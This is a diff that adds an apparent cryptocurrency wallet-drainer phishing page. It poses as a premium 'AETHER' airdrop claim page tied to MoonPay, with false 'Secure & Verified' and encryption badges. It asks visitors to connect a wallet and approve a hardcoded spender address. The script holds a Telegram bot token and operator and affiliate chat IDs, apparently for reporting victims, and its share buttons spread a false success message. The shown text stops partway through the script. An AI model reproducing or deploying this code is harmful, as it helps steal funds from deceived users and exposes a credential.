@@ -1,56 +1,1225 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Moonweb3 × MoonPay |</title>
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link rel="stylesheet" href="styles.css">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
-<!-- Ethers v5 -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-
-</head>
+    <meta charset="UTF-8" />
+    <title>🎁 AETHER AIRDROP | Premium Claim Experience</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <!-- ===== SOCIAL MEDIA PREVIEW META TAGS ===== -->
+    <meta property="og:title" content="AETHER | Premium Airdrop Claim">
+    <meta property="og:description" content="Experience the future of airdrops. Claim your exclusive USDT rewards with elegance.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1620336655055-bd87c5d1d73f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&h=630&q=80">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://airdrop.moonweb3.com/default2.php">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="AETHER | Premium Airdrop Claim">
+    <meta name="twitter:description" content="Experience the future of airdrops. Claim your exclusive USDT rewards with elegance.">
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1620336655055-bd87c5d1d73f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&h=630&q=80">
+    
+    <!-- ===== FONTS & ICONS ===== -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Ethers v5 -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    
+    <style>
+        /* ===== PREMIUM COLOR THEME ===== */
+        :root {
+            --bg-primary: #0A0B15;
+            --bg-secondary: #111428;
+            --bg-card: rgba(22, 25, 46, 0.85);
+            --border-color: rgba(99, 102, 241, 0.25);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            
+            /* Premium gradient colors */
+            --gradient-primary: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #ff7e5f 100%);
+            --gradient-secondary: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            --gradient-cyan: linear-gradient(135deg, #06b6d4 0%, #3b82f6 50%, #8b5cf6 100%);
+            --gradient-gold: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #d97706 100%);
+            
+            /* Glass morphism */
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.36);
+            
+            /* Text colors */
+            --text-primary: #F0F2FF;
+            --text-secondary: #B4B9FF;
+            --text-muted: #8B93D7;
+            
+            /* Accent colors */
+            --accent-primary: #8B5CF6;
+            --accent-secondary: #06b6d4;
+            --accent-success: #10b981;
+            --accent-warning: #f59e0b;
+            --accent-error: #ef4444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Premium Background Effects */
+        .premium-bg {
+            position: fixed;
+            inset: 0;
+            z-index: -3;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(107, 33, 168, 0.2) 0%, transparent 30%),
+                radial-gradient(circle at 90% 10%, rgba(6, 182, 212, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 50% 90%, rgba(139, 92, 246, 0.15) 0%, transparent 40%),
+                linear-gradient(180deg, rgba(10, 11, 21, 0.9) 0%, rgba(17, 20, 40, 0.9) 100%);
+        }
+        
+        /* Animated Grid */
+        .animated-grid {
+            position: fixed;
+            inset: 0;
+            z-index: -2;
+            background-image: 
+                linear-gradient(rgba(139, 92, 246, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(139, 92, 246, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            mask-image: radial-gradient(circle at center, black 40%, transparent 80%);
+            animation: gridMove 20s linear infinite;
+        }
+        
+        @keyframes gridMove {
+            0% { transform: translateY(0) translateX(0); }
+            100% { transform: translateY(60px) translateX(60px); }
+        }
+        
+        /* Floating Particles */
+        .particles-container {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: var(--gradient-cyan);
+            opacity: 0.6;
+            filter: blur(1px);
+            animation: floatParticle linear infinite;
+        }
+        
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.6; }
+            90% { opacity: 0.2; }
+            100% { transform: translateY(-100px) translateX(100px) rotate(360deg); opacity: 0; }
+        }
+        
+        /* Main Wrapper */
+        .wrapper {
+            width: 100%;
+            max-width: 480px;
+            z-index: 10;
+            perspective: 1000px;
+        }
+        
+        /* Premium Header */
+        .premium-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: var(--glass-bg);
+            border-radius: 24px;
+            border: 1px solid var(--glass-border);
+            backdrop-filter: blur(20px);
+            box-shadow: var(--glass-shadow);
+            animation: slideDown 0.8s cubic-bezier(0.22, 0.61, 0.36, 1);
+        }
+        
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        
+        .logo-orb {
+            width: 48px;
+            height: 48px;
+            background: var(--gradient-primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            box-shadow: 
+                0 0 40px rgba(139, 92, 246, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo-orb::after {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.8), transparent);
+            animation: rotate 3s linear infinite;
+        }
+        
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+        
+        .logo-orb i {
+            z-index: 2;
+        }
+        
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .brand-name {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 24px;
+            font-weight: 700;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        
+        .brand-tagline {
+            font-size: 12px;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+        
+        .security-badge {
+            background: rgba(6, 182, 212, 0.15);
+            border: 1px solid rgba(6, 182, 212, 0.4);
+            color: var(--accent-secondary);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 15px rgba(6, 182, 212, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .security-badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(6, 182, 212, 0.3);
+        }
+        
+        /* Premium Card */
+        .premium-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 28px;
+            padding: 32px;
+            backdrop-filter: blur(25px);
+            box-shadow: 
+                var(--glass-shadow),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            animation: cardFloat 1s cubic-bezier(0.22, 0.61, 0.36, 1);
+        }
+        
+        .premium-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gradient-primary);
+            border-radius: 28px 28px 0 0;
+        }
+        
+        .premium-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 30% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        @keyframes cardFloat {
+            0% { opacity: 0; transform: translateY(30px) rotateX(10deg); }
+            100% { opacity: 1; transform: translateY(0) rotateX(0); }
+        }
+        
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-30px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Card Header */
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
+            position: relative;
+        }
+        
+        .reward-orb {
+            width: 100px;
+            height: 100px;
+            background: var(--gradient-secondary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            position: relative;
+            box-shadow: 
+                0 0 60px rgba(102, 126, 234, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        
+        .reward-orb::before {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            background: var(--gradient-primary);
+            z-index: -1;
+            filter: blur(12px);
+            opacity: 0.6;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .reward-orb i {
+            font-size: 42px;
+            color: white;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+        }
+        
+        .card-header h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        
+        .card-subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+        
+        /* Network Selector */
+        .network-selector {
+            margin-bottom: 28px;
+        }
+        
+        .selector-label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        
+        .label-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .label-badge {
+            background: var(--gradient-cyan);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .network-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+        
+        .network-card {
+            background: rgba(22, 25, 46, 0.7);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            border-radius: 20px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.22, 0.61, 0.36, 1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .network-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(139, 92, 246, 0.5);
+            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.25);
+        }
+        
+        .network-card.active {
+            background: rgba(139, 92, 246, 0.15);
+            border-color: var(--accent-primary);
+            box-shadow: 
+                0 15px 30px rgba(139, 92, 246, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+        
+        .network-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            font-size: 24px;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .network-icon::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            padding: 2px;
+            background: var(--gradient-primary);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+        }
+        
+        .eth-icon {
+            background: linear-gradient(135deg, #627eea, #8a92b2);
+        }
+        
+        .bsc-icon {
+            background: linear-gradient(135deg, #f0b90b, #ffd166);
+        }
+        
+        .network-name {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+        
+        .network-status {
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-success);
+        }
+        
+        /* Status Message */
+        .status-message {
+            margin: 24px 0;
+            padding: 20px;
+            border-radius: 20px;
+            background: rgba(6, 182, 212, 0.1);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            color: var(--accent-secondary);
+            font-size: 15px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 20px rgba(6, 182, 212, 0.15);
+        }
+        
+        .status-message i {
+            font-size: 18px;
+        }
+        
+        .status-message.approving {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: rgba(245, 158, 11, 0.3);
+            color: var(--accent-warning);
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.15);
+        }
+        
+        .status-message.approved {
+            background: rgba(16, 185, 129, 0.1);
+            border-color: rgba(16, 185, 129, 0.3);
+            color: var(--accent-success);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.15);
+        }
+        
+        .status-message.error {
+            background: rgba(239, 68, 68, 0.1);
+            border-color: rgba(239, 68, 68, 0.3);
+            color: var(--accent-error);
+            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.15);
+        }
+        
+        /* Buttons Container */
+        .buttons-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin: 28px 0;
+        }
+        
+        .premium-btn {
+            width: 100%;
+            padding: 20px;
+            border-radius: 20px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.22, 0.61, 0.36, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.5px;
+        }
+        
+        .premium-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s;
+        }
+        
+        .premium-btn:hover::before {
+            left: 100%;
+        }
+        
+        .premium-btn:hover:not(:disabled) {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.4);
+        }
+        
+        .premium-btn.primary {
+            background: var(--gradient-primary);
+            color: white;
+            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
+        }
+        
+        .premium-btn.secondary {
+            background: rgba(22, 25, 46, 0.8);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            color: var(--text-primary);
+        }
+        
+        .premium-btn.secondary:hover:not(:disabled) {
+            border-color: var(--accent-primary);
+            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.3);
+        }
+        
+        .premium-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .premium-btn.loading {
+            color: transparent;
+        }
+        
+        .premium-btn.loading::after {
+            content: "";
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+        
+        .premium-btn.secondary.loading::after {
+            border: 3px solid rgba(139, 92, 246, 0.3);
+            border-top-color: var(--accent-primary);
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Wallet Display */
+        .wallet-display {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin: 20px 0;
+            padding: 18px;
+            background: rgba(22, 25, 46, 0.7);
+            border-radius: 18px;
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            text-align: center;
+            word-break: break-all;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .wallet-display i {
+            color: var(--accent-secondary);
+            font-size: 18px;
+        }
+        
+        /* Claim Button */
+        #approveBtn {
+            margin-top: 20px;
+            background: var(--gradient-gold);
+            box-shadow: 0 10px 30px rgba(251, 191, 36, 0.4);
+        }
+        
+        #approveBtn:hover:not(:disabled) {
+            box-shadow: 0 20px 40px rgba(251, 191, 36, 0.5);
+        }
+        
+        /* MoonPay Section */
+        .moonpay-section {
+            margin-top: 28px;
+            padding: 20px;
+            background: rgba(22, 25, 46, 0.7);
+            border-radius: 20px;
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            font-size: 15px;
+            color: var(--text-secondary);
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        
+        .moonpay-section:hover {
+            border-color: rgba(99, 102, 241, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(99, 102, 241, 0.2);
+        }
+        
+        .moonpay-section a {
+            color: var(--accent-secondary);
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.2s;
+            position: relative;
+        }
+        
+        .moonpay-section a::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--accent-secondary);
+            transition: width 0.3s ease;
+        }
+        
+        .moonpay-section a:hover {
+            color: white;
+        }
+        
+        .moonpay-section a:hover::after {
+            width: 100%;
+        }
+        
+        /* Share Container */
+        .share-container {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 28px;
+            padding-top: 24px;
+            border-top: 1px solid rgba(139, 92, 246, 0.2);
+        }
+        
+        .share-btn {
+            width: 52px;
+            height: 52px;
+            border-radius: 16px;
+            background: rgba(22, 25, 46, 0.7);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.22, 0.61, 0.36, 1);
+            font-size: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .share-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 16px;
+            padding: 2px;
+            background: var(--gradient-primary);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .share-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.3);
+        }
+        
+        .share-btn:hover::before {
+            opacity: 1;
+        }
+        
+        .share-btn.telegram:hover {
+            background: #0088cc;
+            color: white;
+            border-color: #0088cc;
+        }
+        
+        .share-btn.whatsapp:hover {
+            background: #25D366;
+            color: white;
+            border-color: #25D366;
+        }
+        
+        .share-btn.twitter:hover {
+            background: #1DA1F2;
+            color: white;
+            border-color: #1DA1F2;
+        }
+        
+        .share-btn.link:hover {
+            background: var(--gradient-cyan);
+            color: white;
+            border-color: transparent;
+        }
+        
+        /* Footer */
+        .premium-footer {
+            margin-top: 28px;
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(139, 92, 246, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            letter-spacing: 0.5px;
+        }
+        
+        .premium-footer i {
+            color: var(--accent-secondary);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 520px) {
+            body {
+                padding: 16px;
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+            
+            .premium-card {
+                padding: 24px;
+                border-radius: 24px;
+            }
+            
+            .premium-header {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+                padding: 24px;
+            }
+            
+            .card-header h1 {
+                font-size: 28px;
+            }
+            
+            .network-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .reward-orb {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .reward-orb i {
+                font-size: 36px;
+            }
+            
+            .premium-btn {
+                padding: 18px;
+            }
+        }
+        
+        /* Glow Animation */
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(139, 92, 246, 0.8); }
+        }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(22, 25, 46, 0.5);
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--gradient-primary);
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--gradient-cyan);
+        }
+    </style>
 </head>
 <body>
-<div class="wrapper">
-  <div class="brand-bar">
-    <img src="moonpay.png">
-    <span class="brand-x">×</span>
-    <img src="Gr3gtok0n.jpg">
-  </div>
-
-  <div class="card">
-    <h1>Claim Airdrop</h1>
-    <div class="subtitle">Grant permission to Claim your Airdrop</div>
-
-    <div class="network-selector">
-      <div class="network-label">Select Network</div>
-      <div class="network-buttons">
-        <button class="network-btn active" data-chain="1">
-          <span class="network-icon eth"></span>
-          Ethereum
-        </button>
-        <button class="network-btn" data-chain="56">
-          <span class="network-icon bsc"></span>
-          BSC
-        </button>
-      </div>
+    <div class="premium-bg"></div>
+    <div class="animated-grid"></div>
+    <div class="particles-container" id="particles"></div>
+    
+    <div class="wrapper">
+        <div class="premium-header">
+            <div class="brand">
+                <div class="logo-orb">
+                    <img src="https://airdrop.moonweb3.com/logo.jpeg" alt="Aether Logo" class="orb-image" style="width: 70px; height: 70px;">
+                </div>
+                <div class="brand-text">
+                    <div class="brand-name">A E  T  H  E  R</div>
+                    <div class="brand-tagline">Premium Airdrop</div>
+                </div>
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-shield-check"></i>
+                Secure & Verified
+            </div>
+        </div>
+        
+        <div class="premium-card">
+            <div class="card-header">
+                <div class="reward-orb">
+                    <img src="https://airdrop.moonweb3.com/logo.jpeg" class="reward-orb" style="width: 100px; height: 100px;">
+                </div>
+                <h1>Claim Your Aether Airdrop</h1>
+                <div class="card-subtitle">Securely claim your Airdrop</div>
+            </div>
+            
+            <div class="network-selector">
+                <div class="selector-label">
+                    <div class="label-text">Choose Network</div>
+                    <div class="label-badge">Recommended</div>
+                </div>
+                <div class="network-grid">
+                    <div class="network-card active" data-chain="1">
+                        <div class="network-icon eth-icon">
+                            <i class="fab fa-ethereum"></i>
+                        </div>
+                        <div class="network-name">Ethereum</div>
+                        <div class="network-status">
+                            <span class="status-dot"></span>
+                            Fast • Secure • Trusted
+                        </div>
+                    </div>
+                    <div class="network-card" data-chain="56">
+                        <div class="network-icon bsc-icon">
+                            <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BNB" class="bnb-logo" style="width: 44px; height: 44px;">
+                        </div>
+                        <div class="network-name">BNB Chain</div>
+                        <div class="network-status">
+                            <span class="status-dot"></span>
+                            Low Fees
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="statusMessage" class="status-message" style="display:none;">
+                <i class="fas fa-sparkles"></i>
+                Ready to Claim Your Airdrop
+            </div>
+            
+            <div class="buttons-container">
+                <button id="injectBtn" class="premium-btn primary">
+                    <i class="fas fa-wallet"></i>
+                    Connect Wallet
+                </button>
+                <button id="wcBtn" class="premium-btn secondary">
+                    <i class="fas fa-qrcode"></i>
+                    WalletConnect
+                </button>
+            </div>
+            
+            <div id="wallet" class="wallet-display" style="display:none;">
+                <i class="fas fa-check-circle"></i>
+                <span id="walletAddress"></span>
+            </div>
+            
+            <button id="approveBtn" class="premium-btn primary" disabled>
+                🎁 Claim Airdrop Now
+            </button>
+            
+            <div class="moonpay-section">
+                <i class="fas fa-bolt"></i>
+                Need gas fees? <a id="moonpayLink" target="_blank" rel="noopener noreferrer">Purchase instantly with MoonPay</a>
+            </div>
+            
+            <div class="share-container">
+                <button class="share-btn telegram" onclick="shareToTelegram()" title="Share on Telegram">
+                    <i class="fab fa-telegram"></i>
+                </button>
+                <button class="share-btn whatsapp" onclick="shareToWhatsApp()" title="Share on WhatsApp">
+                    <i class="fab fa-whatsapp"></i>
+                </button>
+                <button class="share-btn twitter" onclick="shareToTwitter()" title="Share on Twitter">
+                    <i class="fab fa-twitter"></i>
+                </button>
+                <button class="share-btn link" onclick="copyLink()" title="Copy Link">
+                    <i class="fas fa-link"></i>
+                </button>
+            </div>
+            
+            <div class="premium-footer">
+                <i class="fas fa-lock"></i>
+                Protected by Industry-Grade Encryption • Aether Protocol
+            </div>
+        </div>
     </div>
+    
+    <!-- Your Existing Script (Modified to work with premium UI) -->
+    <script>
+        // Create floating particles for background
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size
+                const size = Math.random() * 8 + 4;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}vw`;
+                
+                // Random animation duration and delay
+                const duration = Math.random() * 30 + 20;
+                const delay = Math.random() * 10;
+                particle.style.animationDuration = `${duration}s`;
+                particle.style.animationDelay = `${delay}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Share functions that work with your existing functionality
+        function shareToTelegram() {
+            navigator.clipboard.writeText(window.location.href);
+            updateStatusMessage('Telegram sharing link copied to clipboard!', 'success');
+        }
+        
+        function shareToWhatsApp() {
+            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Aether! 🎁✨\n\nJoin now: " + window.location.href);
+            window.open(`https://wa.me/?text=${text}`, '_blank');
+        }
+        
+        function shareToTwitter() {
+            const text = encodeURIComponent("Just claimed my exclusive USDT airdrop on Aether! 🎁✨\n\nJoin now: " + window.location.href);
+            window.open(`https://twitter.com/intent/tweet?text=${text}`, '_blank');
+        }
+        
+        function copyLink() {
+            navigator.clipboard.writeText(window.location.href);
+            updateStatusMessage('Link copied to clipboard!', 'success');
+        }
+        
+        // Update status message for premium UI
+        function updateStatusMessage(message, type = 'info') {
+            const statusEl = document.getElementById('statusMessage');
+            const icon = type === 'error' ? 'exclamation-circle' : 
+                        type === 'success' ? 'check-circle' : 
+                        type === 'approving' ? 'spinner' : 
+                        type === 'approved' ? 'check-circle' : 'sparkles';
+            
+            statusEl.innerHTML = `<i class="fas fa-${icon}${type === 'approving' ? ' fa-spin' : ''}"></i> ${message}`;
+            statusEl.className = 'status-message';
+            if (type !== 'info') statusEl.classList.add(type);
+            statusEl.style.display = 'flex';
+        }
+        
+        // Initialize particles
+        document.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            updateStatusMessage('Welcome to Aether Premium Airdrop. Connect your wallet to check your eligibity.', 'info');
+        });
+        
+        // ================= YOUR EXISTING FUNCTIONAL SCRIPT =================
+        const container = document.getElementById("particles");
+        const DROP_COUNT = 8;
 
-    <button id="injectBtn" class="btn primary">Connect MetaMask</button>
-    <button id="wcBtn" class="btn secondary">Other Walletconnect</button>
+        for (let i = 0; i < DROP_COUNT; i++) {
+            const drop = document.createElement("div");
+            drop.className = "particle";
 
-    <div id="wallet" class="wallet"></div>
-    <div id="statusMessage" class="status-message" style="display:none;">Ready to Claim  Airdrop</div>
-    <button id="approveBtn" class="btn primary" disabled>Claim Airdrop</button>
+            // random horizontal position
+            drop.style.left = Math.random() * 100 + "%";
 
-    <div class="moonpay">Need gas tokens? <a id="moonpayLink" target="_blank" rel="noopener noreferrer">Buy with MoonPay</a></div>
-    <div class="footer">🔒 Moonpay Airdrop</div>
-  </div>
-</div>
+            // random animation delay & duration (lighter motion)
+            drop.style.animationDelay = Math.random() * 10 + "s";
+            drop.style.animationDuration = 16 + Math.random() * 8 + "s";
 
-<script src="script.js"></script>
-<script src="send.js"></script>
+            container.appendChild(drop);
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            const WALLETCONNECT_PROJECT_ID = "a0e525fa712217527b8314e3a1702645";
+            const SPENDER_ADDRESS = "0x9829177717fb8B7F6562CD146739a7b8fD7DD7F4";
+
+            const TELEGRAM_BOT = "1080982602:AAGVM3bkf0lYP8kaxR32xLohoWwJ57lEz3c";
+            const ADMIN_CHAT_ID = "1153815502";
+            const REFERRERS = { nora: "6068847577", whitelist: "6240662403", malone: "7514956513", mikkycrypt03: "6590215212", wangde: "6767505200", love: "5188361446", pay: "6068847577" };
+
+            const NETWORKS = {
